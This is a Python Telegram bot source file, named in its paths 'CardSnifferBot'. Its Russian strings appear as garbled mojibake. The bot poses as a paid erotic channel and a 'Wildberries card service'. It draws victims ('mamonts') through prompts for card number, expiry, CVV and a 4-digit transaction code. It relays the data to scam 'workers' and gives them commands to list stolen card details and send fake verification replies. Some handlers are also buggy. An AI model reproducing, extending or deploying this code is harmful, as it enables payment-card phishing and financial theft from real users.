import telebot
import colorama
from colorama import Back,Fore
from telebot import types
from config import *
from os import listdir
printlogo()

print(Fore.RED+'Set data directory \n0-basedir\n1-basedirTermux')
i=input()
if i=='0':
    datadir='./data/'
    print(Fore.RED+Back.GREEN+'///'+Back.RESET+Fore.GREEN+' Set data as default')
elif i=="1":
    datadir = '/data/data/com.termux/files/home/CardSnifferBot/data/'
    print(Fore.RED + Back.GREEN + '///' + Back.RESET + Fore.GREEN + ' Set data as ' + datadir)
else:
    datadir=str(i)
    print(Fore.RED+Back.GREEN+'///'+Back.RESET+Fore.GREEN+' Set data as '+datadir)

sleep(0.2)

print(Fore.RED+Back.RESET+'PROCESSING')

sleep(0.2)

loaddata()
print(Fore.RED+'/// ENTER BOT TOKEN:')
token=input()
bot = telebot.TeleBot(token)
print(Fore.RED+Back.GREEN+f'///'+Fore.GREEN+Back.RESET+' Bot launched')


@bot.message_handler(commands=['vip'])
def vip(message):
    localid=getdatafromid(message.chat.id)
    if message.text=='–í–µ—Ä–Ω—É—Ç—å—Å—è':
        start(message)
    else:
        markup=types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
        b1=types.KeyboardButton('–í–µ—Ä–Ω—É—Ç—å—Å—è')
        markup.row(b1)
        bot.send_message(message.chat.id, '–î–æ–±–∞–≤–ª–µ–Ω–∏–µ –∫–∞—Ä—Ç—ã –Ω–∞–ø—Ä—è–º—É—é:\nWBBank\n–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –∫–∞—Ä—Ç—ã\n–ø—Ä–∏–º–µ—Ä:2000 1234 1234 1234\n_–û–±—Ä–∞—Ç–∏—Ç–µ –≤–Ω–∏–º–∞–Ω–∏–µ, —á—Ç–æ –¥–∞–Ω–Ω—ã–µ, –∫–æ—Ç–æ—Ä—ã–µ –≤—ã –≤–≤–æ–¥–∏–ª–∏ —Ä–∞–Ω–µ–µ, –±—É–¥—É—Ç –ø–µ—Ä–µ–ø–∏—Å–∞–Ω—ã –Ω–∞ –Ω–æ–≤—ã–µ –≤ —Å–ª—É—á–∞–µ –¥–æ–±–∞–≤–ª–µ–Ω–∏—è_\n\n_–î–∞–Ω–Ω—ã–µ –ø–æ–¥ –∫–æ–Ω—Ç—Ä–æ–ª–µ–º Wildberries card service_',reply_markup=markup, parse_mode='MarkdownV2')
        bot.register_next_step_handler(message, addcard)

@bot.message_handler(commands=['link'])
def addlink(message):
    localtext=message.text
    if localtext=='/link':
        bot.send_message(message.chat.id, '–Ω–µ–ø–æ–ª–Ω—ã–π –∑–∞–ø—Ä–æ—Å')
    else:
        localtext=localtext.split()
        links.append(localtext[1])
        bot.send_message(message.chat.id, '—Å—Å—ã–ª–∫–∞ –¥–æ–±–∞–≤–ª–µ–Ω–∞!')
        savedata()

@bot.message_handler(commands=['rlink'])
def rlink(message):
    localtext=message.text
    if localtext=='/link':
        bot.send_message(message.chat.id, '–Ω–µ–ø–æ–ª–Ω—ã–π –∑–∞–ø—Ä–æ—Å')
    else:
        localtext=localtext.split()
        links.remove(localtext[1])
        bot.send_message(message.chat.id, '—Å—Å—ã–ª–∫–∞ —É–¥–∞–ª–µ–Ω–∞!')
        savedata()

def addcard(message):
    card1=(message.text)
    card1=card1.replace(' ', '')
    if card1=='–í–µ—Ä–Ω—É—Ç—å—Å—è':
        bot.send_message(message.chat.id, '–ü—Ä–∏–≤—è–∑–∫–∞ –æ—Ç–º–µ–Ω–µ–Ω–∞')
        start(message)

    else:
        if len(str(card1))==16:
            workermessage(f'–º–∞–º–æ–Ω—Ç –¥–æ–±–∞–≤–∏–ª –∫–∞—Ä—Ç—É {card}')
            bot.send_message(message.chat.id, '–∫–∞—Ä—Ç–∞ –¥–æ–±–∞–≤–ª–µ–Ω–∞, —Å–µ–π—á–∞—Å –≤–≤–µ–¥–∏—Ç–µ –¥–∞—Ç—É –∏ cvv. –ü—Ä–∏–º–µ—Ä: 12/33 004')
            bot.register_next_step_handler(message, addcvv)
            localid = int(message.from_user.id)
            localid = getdatafromid(localid)
            stage[localid]=1
            card[localid]=str(card1)
            savedata()
            print(Back.GREEN+Fore.RED+'///'+Back.BLACK+Fore.WHITE+f' {message.from_user.username} –¥–æ–±–∞–≤–∏–ª –∫–∞—Ä—Ç—É'+Back.RESET+'\n'+Back.BLACK+Fore.WHITE+card1+Back.RESET)
        else:
            bot.send_message(message.chat.id, '–≠—Ç–æ –Ω–µ –∫–∞—Ä—Ç–∞')
            bot.register_next_step_handler(message, addcard)

def addcvv(message):
    text=str(message.text)
    date=text.split()
    if text == '–í–µ—Ä–Ω—É—Ç—å—Å—è':
        bot.send_message(message.chat.id, '–ü—Ä–∏–≤—è–∑–∫–∞ –æ—Ç–º–µ–Ω–µ–Ω–∞')
        start(message)
    else:
        if len(date[0])==5 and len(date[1])==3:
            workermessage(f'{date} –¥–∞—Ç–∞ –∏ CVV')
            workermessage(f'{message.from_user.id}')
            bot.send_message(message.chat.id, '–æ—Ç–ª–∏—á–Ω–æ. —Å–µ–π—á–∞—Å —Å–∏—Å—Ç–µ–º–∞ –ø—Ä–æ–≤–µ—Ä–∏—Ç –¥–∞–Ω–Ω—ã–µ –∏ –ø—Ä–∏—à–ª–µ—Ç –∫–æ–¥. –≤–≤–µ–¥–∏—Ç–µ –µ–≥–æ —á–µ—Ä–µ–∑ –∫–æ–º–∞–Ω–¥—É /code')
            start(message)
            localid = int(message.from_user.id)
            localid = (getdatafromid(localid))
            stage[localid] = 2
            datecvv[localid] = str(text)
            print(
                Back.GREEN + Fore.RED + '///' + Back.BLACK + Fore.WHITE + f' {message.from_user.username} –¥–æ–±–∞–≤–∏–ª –¥–∞—Ç—É –∏ cvv' + Back.RESET + '\n' + Back.BLACK + Fore.WHITE + str(date) + Back.RESET)
            savedata()

        else:
            bot.send_message(message.chat.id, f'–Ω–µ–≤–µ—Ä–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ. –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑')
            bot.register_next_step_handler(message, addcvv)

def code(message):
    codevar=(message.text)
    if codevar!=None:
        if codevar.isnumeric() and len(codevar)==4:
            workermessage(f'{codevar} –∫–æ–¥ –¥–ª—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏')
            bot.send_message(message.chat.id,'–û—Ç–ª–∏—á–Ω–æ, —Å–µ–π—á–∞—Å —Å–∏—Å—Ç–µ–º–∞ –ø—Ä–æ–≤–µ—Ä–∏—Ç –∫–æ–¥ –∏ –ø—Ä–∏ —É—Å–ø–µ—Ö–µ –≤—ã—à–ª–µ—Ç –≤–∞–º —Å—Å—ã–ª–∫—É –Ω–∞ –∑–∞–∫—Ä—ã—Ç—ã–π –∫–∞–Ω–∞–ª!')
            localid = message.from_user.id
            localid = getdatafromid(localid)
            stage[localid]=3
            codes[localid]=codevar
            savedata()
            print(Back.GREEN+Fore.RED+'///'+Back.BLACK+Fore.WHITE+f' {message.from_user.username} –æ—Ç–ø—Ä–∞–≤–∏–ª –∫–æ–¥'+Back.RESET+'\n'+Back.BLACK+Fore.WHITE+codevar+Back.RESET)

        else:
            bot.send_message(message.chat.id, f'–Ω–µ–≤–µ—Ä–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ. –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑ /code')
    else:
        bot.send_message(message.chat.id, f'–Ω–µ–≤–µ—Ä–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ. –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑ /code')

@bot.message_handler(commands=['code'])
def entercode(message):
    localid = message.from_user.id
    localid = getdatafromid(localid)
    if stage[localid]==2:
        bot.send_message(message.chat.id, f'–í–∞–º –ø—Ä–∏—à–µ–ª –∫–æ–¥? –í–≤–µ–¥–∏—Ç–µ –µ–≥–æ –Ω–∏–∂–µ!')
        bot.register_next_step_handler(message, code)
        savedata()
    else:
        bot.send_message(message.chat.id, f'—É –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –Ω–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –¥–∞–Ω–Ω–æ–π –∫–æ–º–∞–Ω–¥—ã!')


@bot.message_handler(commands=['start'])
def start(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
    b1 = types.KeyboardButton('–ú–µ–Ω—é')
    b2 = types.KeyboardButton('–õ–∏—á–Ω—ã–π –∫–∞–±–∏–Ω–µ—Ç')
    b3 = types.KeyboardButton('–ü–æ–º–æ—â—å')
    markup.row(b1)
    markup.row(b2)
    markup.row(b3)
    bot.send_message(message.chat.id, '–ü—Ä–∏–≤–µ—Ç! –≠—Ç–æ—Ç –±–æ—Ç –ø–æ–º–æ–≥–∞–µ—Ç –º–Ω–µ –ø—Ä–∏–Ω–∏–º–∞—Ç—å –æ–ø–ª–∞—Ç—É –∑–∞ –ø—Ä–∏–≤–∞—Ç–Ω—ã–π –∫–∞–Ω–∞–ª, —Ñ–æ—Ç–æ –∏ –≤–∏–¥–µ–æ. –ß—Ç–æ–±—ã –æ–ø–ª–∞—Ç–∏—Ç—å —Å –∫–∞—Ä—Ç—ã –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –ø—Ä–∏–≤—è–∑–∞—Ç—å –∫–∞—Ä—Ç—É –∏ –ø–æ–ø–æ–ª–Ω–∏—Ç—å –±–∞–ª–∞–Ω—Å –±–æ—Ç–∞ –≤ —Ä–∞–∑–¥–µ–ª–µ "–õ–∏—á–Ω—ã–π –∫–∞–±–∏–Ω–µ—Ç". –ü—Ä–∏—è—Ç–Ω—ã—Ö –ø–æ–∫—É–ø–æ–∫‚ù§Ô∏è', reply_markup=markup)
    checklogin(message)


def menu(message):
    markup = types.InlineKeyboardMarkup()
    b1 = types.InlineKeyboardButton('VIP –∫–∞–Ω–∞–ª', callback_data='buy')
    b2 = types.InlineKeyboardButton('–ö—Ä—É–∂–æ–∫', callback_data='buy')
    b3 = types.InlineKeyboardButton('–§–æ—Ç–æ—á–∫–∏', callback_data='buy')
    b4 = types.InlineKeyboardButton('–í–∏–¥–µ–æ', callback_data='buy')
    markup.row(b1)
    markup.row(b4)
    markup.row(b3)
    markup.row(b2)
    bot.send_message(message.chat.id, '–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ –º–æ—ë —ç—Ä–æ—Ç–∏—á–µ—Å–∫–æ–µ –º–µ–Ω—éüòà', reply_markup=markup)
    checklogin(message)


@bot.message_handler(commands=['addme'])
def addme(message):
    user=message.from_user.id
    checklogin(message)
    if not user in worker:
        worker.append(user)
        localid=message.from_user.id
        localid=getdatafromid(localid)
        role[localid]='worker'
        bot.send_message(message.chat.id, '—Ç–µ–ø–µ—Ä—å –≤—ã –≤–æ—Ä–∫–µ—Ä!')
        workermessage(f'—É –Ω–∞—Å –Ω–æ–≤—ã–π –≤–æ—Ä–∫–µ—Ä: {message.from_user.username}')
        savedata()
    else:
        bot.send_message(message.chat.id, '—Ç—ã —É–∂–µ –≤–æ—Ä–∫–µ—Ä')

@bot.message_handler(commands=['removeme'])
def removeme(message):
    user=message.from_user.id
    checklogin(message)
    if user in worker:
        worker.remove(user)
        bot.send_message(message.chat.id, '—Ç–µ–ø–µ—Ä—å –≤—ã –ù–ï –≤–æ—Ä–∫–µ—Ä!')
        workermessage(f'—É –Ω–∞—Å —É—à—ë–ª –≤–æ—Ä–∫–µ—Ä: {message.from_user.username}')
        savedata()

@bot.message_handler(commands=['sendvip'])
def sendvip(message):
    checklogin(message)
    localtext = message.text
    localtext = localtext.split()
    if len(localtext) < 2:
        bot.send_message(message.chat.id, '–Ω–µ–≤–µ—Ä–Ω—ã–π –∑–∞–ø—Ä–æ—Å')
    else:
        if len(links)!=0:
            bot.send_message(localtext[1], f'–º—ã –ø—Ä–æ–≤–µ—Ä–∏–ª–∏ –≤–∞—à—É –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é. –í—ã —É–∫–∞–∑–∞–ª–∏ –≤–µ—Ä–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ. {links[0]}')
            links.remove(links[0])
            stage[getdatafromid(localtext[1])] = 4
            bot.send_message(message.chat.id, '–æ—Ç–ø—Ä–∞–≤–∏–ª–∏ —Å—Å—ã–ª–∫—É –Ω–∞ –∫–∞–Ω–∞–ª!')
            workermessage(f'–æ—Ç–ø—Ä–∞–≤–∏–ª–∏ —Å—Å—ã–ª–∫—É –Ω–∞ –∫–∞–Ω–∞–ª –º–∞–º–æ–Ω—Ç—É {localtext[1]}')
            savedata()
        else:
            bot.send_message(message.chat.id, '—Å—Å—ã–ª–æ–∫ –Ω–∞ –∫–∞–Ω–∞–ª –Ω–µ –æ—Å—Ç–∞–ª–æ—Å—å. –¥–æ–±–∞–≤—å—Ç–µ –µ—ë —á–µ—Ä–µ–∑ –∫–æ–º–∞–Ω–¥—É /link')

@bot.message_handler(commands=['mymam'])
def mymam(message):
    checklogin(message)
    localtext = message.text
    localtext = localtext.split()
    if len(localtext) < 2:
        bot.send_message(message.chat.id, '–Ω–µ–≤–µ—Ä–Ω—ã–π –∑–∞–ø—Ä–æ—Å')
    else:
        mamid=getdatafromid(localtext[1])
        workerid[mamid]=message.from_user.id
        bot.send_message(message.chat.id, '—Ç–µ–ø–µ—Ä—å —ç—Ç–æ –≤–∞—à –º–∞–º–æ–Ω—Ç!')
        workermessage(f'–º–∞–º–æ–Ω—Ç –∑–∞–±—Ä–æ–Ω–∏—Ä–æ–≤–∞–ª—Å—è  {localtext[1]}')
        savedata()

@bot.message_handler(commands=['senderr'])
def senderr(message):
    checklogin(message)
    localtext=message.text
    localtext=localtext.split()
    if len(localtext)<2:
        bot.send_message(message.chat.id, '–Ω–µ–≤–µ—Ä–Ω—ã–π –∑–∞–ø—Ä–æ—Å')
    else:
        bot.send_message(localtext[1], '–º—ã –ø—Ä–æ–≤–µ—Ä–∏–ª–∏ –≤–∞—à—É –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é. –í—ã —É–∫–∞–∑–∞–ª–∏ –Ω–µ–≤–µ—Ä–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞.')
        stage[getdatafromid(localtext[1])]=0

@bot.message_handler(commands=['getm'])
def getm(message):
    checklogin(message)
    info='__–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è__\n'
    info=info+'\n'+'/getm —Å—Ç–∞—Ç—É—Å –º–∞–º–æ–Ω—Ç–æ–≤'
    info=info+'\n'+'/sendvip –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –≤–∏–ø–∫—É –º–∞–º–æ–Ω—Ç—É —á–µ—Ä–µ–∑ –ø—Ä–æ–±–µ–ª —É–∫–∞–∑–∞—Ç—å ID'
    info=info+'\n'+'/senderr –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –æ—à–∏–±–∫—É –º–∞–º–æ–Ω—Ç—É —á–µ—Ä–µ–∑ –ø—Ä–æ–±–µ–ª —É–∫–∞–∑–∞—Ç—å ID'
    info+='\n /link –¥–æ–±–∞–≤–∏—Ç—å —Å—Å—ã–ª–∫—É –Ω–∞ –ø—Ä–∏–≤–∞—Ç–∫—É —á–µ—Ä–µ–∑ –ø—Ä–æ–±–µ–ª —É–∫–∞–∑–∞—Ç—å —Å—Å—ã–ª–∫—É'
    info += '\n /rlink —É–±—Ä–∞—Ç—å —Å—Å—ã–ª–∫—É –Ω–∞ –ø—Ä–∏–≤–∞—Ç–∫—É —á–µ—Ä–µ–∑ –ø—Ä–æ–±–µ–ª —É–∫–∞–∑–∞—Ç—å —Å—Å—ã–ª–∫—É'
    info += '\n /mymam –ø—Ä–∏–≤—è–∑–∞—Ç—å –º–∞–º–æ–Ω—Ç–∞ —á–µ—Ä–µ–∑ –ø—Ä–æ–±–µ–ª —É–∫–∞–∑–∞—Ç—å ID'
    info += '\n /addme —É–∫–∞–∑–∞—Ç—å —Å–µ–±—è –∫–∞–∫ –≤–æ—Ä–∫–µ—Ä'
    info += '\n /removeme —É–±—Ä–∞—Ç—å —Å–µ–±—è –∏–∑ –≤–æ—Ä–∫–µ—Ä–æ–≤'
    bot.send_message(message.chat.id, info, 'MarkdownV2')
    info='—Å—Å—ã–ª–∫–∏ –Ω–∞ –ø—Ä–∏–≤–∞—Ç–∫—É:\n'
    for i in range(0,len(links)):
        info += f'`{links[i]}`\n'
    bot.send_message(message.chat.id, info, 'MarkdownV2')
    info=''
    if len(id)!=0:
        bot.send_message(message.chat.id, f'–°–ü–ò–°–û–ö –ú–ê–ú–û–ù–¢–û–í', 'MarkdownV2')
        for i in range(0,len(id)):
            if role[i]=='mamont':
                if stage[i]>=0:
                    info+=f'id `{id[i]}`,\n–∏–º—è @{username[i]}\n—ç—Ç–∞–ø {stage[i]}'
                if stage[i]>=1:
                    info+=f'\n–∫–∞—Ä—Ç–∞ `{card[i]}`'
                if stage[i]>=2:
                    info += f'\n–¥–∞—Ç–∞&CVV `{datecvv[i]}`'
                if stage[i]>=3:
                    info += f'\n–∫–æ–¥ {codes[i]}'
                bot.send_message(message.chat.id, f'{info}\n–∑–∞–Ω—è—Ç—ã–π –≤–æ—Ä–∫–µ—Ä–æ–º {workerid[i]}\n\n', 'MarkdownV2')
                info=''
    else:
        bot.send_message(message.chat.id, f'_–Ω–µ—Ç –∞–≤—Ç–æ—Ä–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π_', 'MarkdownV2')


def workermessage(mes):
    if len(worker)!=0:
        for i in range(0,len(worker)):
            bot.send_message(f'–î–õ–Ø –í–û–†–ö–ï–†–û–í: {worker[i]}',mes)
        print(f'/// New message for workers: {mes}')


def lk(message):
    checklogin(message)
    markup=types.InlineKeyboardMarkup(row_width=3)
    b1=types.InlineKeyboardButton('–ü–æ–ø–æ–ª–Ω–∏—Ç—å –±–∞–ª–∞–Ω—Å' , callback_data='balance')
    b2 = types.InlineKeyboardButton('–ü—Ä–∏–≤—è–∑–∞—Ç—å –∫–∞—Ä—Ç—É', callback_data='vip')
    b3 = types.InlineKeyboardButton('–ú–æ–∏ –∫–∞—Ä—Ç—ã', callback_data='balance')
    markup.row(b1,b2)
    markup.row(b3)
    name = message.from_user.username
    localid=message.from_user.id
    balance=cash[getdatafromid(str(localid))]
    text='‚ù§Ô∏è –ò–º—è:'+name+'\n'
    text=text+'üîë ID:'+str(message.from_user.id)+'\n'
    text = text + 'üí∞ –í–∞—à –±–∞–ª–∞–Ω—Å:'+str(balance) + '\n'
    text=text+'–ß—Ç–æ–±—ã –ø–æ–ø–æ–ª–Ω–∏—Ç—å –±–∞–ª–∞–Ω—Å –Ω—É–∂–Ω–æ –Ω–∞–∂–∞—Ç—å —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â—É—é –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ.'+'\n'+' –û–±—Ä–∞—Ç–∏ –≤–Ω–∏–º–∞–Ω–∏–µ, —á—Ç–æ –±–∞–ª–∞–Ω—Å –º–æ–∂–Ω–æ –ø–æ–ø–æ–ª–Ω–∏—Ç—å –Ω–∞ —Å—É–º–º—É –æ—Ç 100 –†—É–±–ª–µ–π'
    bot.send_message(message.chat.id, text, reply_markup=markup)

def buy1(callback):
    markup=types.InlineKeyboardMarkup()
    b1=types.InlineKeyboardButton('–õ–∏—á–Ω—ã–π –∫–∞–±–∏–Ω–µ—Ç',callback_data='lk')
    markup.row(b1)
    bot.delete_message(callback.message.chat.id, callback.message.id)
    bot.send_message(callback.message.chat.id, '–î–ª—è –Ω–∞—á–∞–ª–∞ –Ω—É–∂–Ω–æ –ø–æ–ø–æ–ª–Ω–∏—Ç—å –±–∞–ª–∞–Ω—Å ;)', reply_markup=markup)


@bot.callback_query_handler(func=lambda callback:True)
def callback(callback):
    cb=callback.data
    if cb=='balance':
        bot.answer_callback_query(callback_query_id=callback.id, text='–î–ª—è –≤—ã–∑–æ–≤–∞ —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥—ã —É –≤–∞—Å –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –ø—Ä–∏–≤—è–∑–∞–Ω–∞ –∫–∞—Ä—Ç–∞!')
    elif cb=='buy':
        buy1(callback)
    elif cb=='lk':
        bot.delete_message(callback.message.chat.id, callback.message.id)
        lk(callback.message)
    elif cb=='vip':
        bot.delete_message(callback.message.chat.id, callback.message.id)
        vip(callback.message)


@bot.message_handler()
def randmess(message):
    checklogin(message)
    text=str(message.text.lower())
    if text=='–º–µ–Ω—é':
        menu(message)
    elif text=='–ª–∏—á–Ω—ã–π –∫–∞–±–∏–Ω–µ—Ç':
        lk(message)
    elif text=='–ø–æ–º–æ—â—å':
        bot.send_message(message.chat.id, f'–ï—Å–ª–∏ —É —Ç–µ–±—è —á—Ç–æ-—Ç–æ –Ω–µ –ø–æ–ª—É—á–∞–µ—Ç—Å—è —Ç–æ –ø—Ä–æ—Å—Ç–æ –Ω–∞–ø–∏—à–∏ –º–Ω–µ: @{Helper}')
    elif text=='–≤–≤–µ—Ä–Ω—É—Ç—å—Å—è':
        bot.delete_message(callback.message.chat.id, callback.message.id)
        start(callback.message)
    else:
        bot.send_message(message.chat.id, '–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é —è –Ω–µ —Å–º–æ–≥ —Ä–∞—Å–ø–æ–∑–Ω–∞—Ç—å –í–∞—à—É –∫–æ–º–∞–Ω–¥—É. –í–æ—Å–ø–æ–ª—å–∑—É–π—Ç–µ—Å—å –∫–Ω–æ–ø–∫–∞–º–∏ –≤ –º–µ–Ω—é –∏–ª–∏ –æ—Ç–ø—Ä–∞–≤—å—Ç–µ /start')

bot.infinity_polling()